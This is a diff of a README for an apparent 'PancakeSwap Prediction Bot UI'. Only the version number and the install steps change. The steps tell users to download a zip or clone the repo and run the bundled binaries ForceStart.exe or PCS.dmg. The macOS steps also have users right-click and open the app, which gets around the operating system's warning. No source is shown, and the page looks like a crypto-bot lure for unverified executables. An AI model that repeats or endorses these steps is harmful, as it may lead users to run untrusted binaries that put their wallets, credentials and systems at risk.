@@ -5,7 +5,7 @@
 <img src=https://img.shields.io/github/issues-pr/SilviaKadeh/pancake-predict-bot-UI-Supported?style=for-the-badge&logo=appveyor&color=informational />
 </p>
   
-# 🔮 PancakeSwap Prediction Bot UI v9.0.1 🚀 
+# 🔮 PancakeSwap Prediction Bot UI v9.2.1 🚀 
 
 PancakeSwap Prediction Bot using AI recommendations.
 
@@ -46,7 +46,7 @@ With these updates, our goal is to provide a safer, more flexible, and user-cent
 ## 🐰⚡ Installation
 
 - Download [This Repo](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/archive/refs/heads/main.zip) the repository release and extract files. 
-- Double-click on the "ForceStart.exe" or "PCS.app" file to run it.
+- Double-click on the "ForceStart.exe" or "PCS.dmg" file to run it.
 - And follow the instructions in the application window.
 
 ## 🐰⚡ Installation on CMD - Windows
@@ -73,10 +73,12 @@ cd pancake-predict-bot-UI-Supported
 "ForceStart.exe"
 ```
 
-## 🐰⚡ Installation on Terminal - MacOs
+## 🐰⚡ Installation - MacOS
+
+## Way 1
 
 - Download [This Repo](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/archive/refs/heads/main.zip) the repository release and extract files. 
-- Double-click on the "PCS.app" file to run it.
+- Double-Click on the "PCS.dmg" -> Right-click on the "PCS.app" and click open to run it.
 
 or
   
@@ -85,7 +87,7 @@ Then run the following commands in Terminal:
 ```shell
 git clone https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported
 cd pancake-predict-bot-UI-Supported
-"PCS.app"
+"PCS.dmg"
 ```
 
 ##  Strategy (You can easily configure all parameter settings through the interface)
@@ -127,3 +129,4 @@ cd pancake-predict-bot-UI-Supported
 # Support Chat
 
 Join the telegram [support chat](https://t.me/pancakeswapprediction) You can access all our announcements here.
+
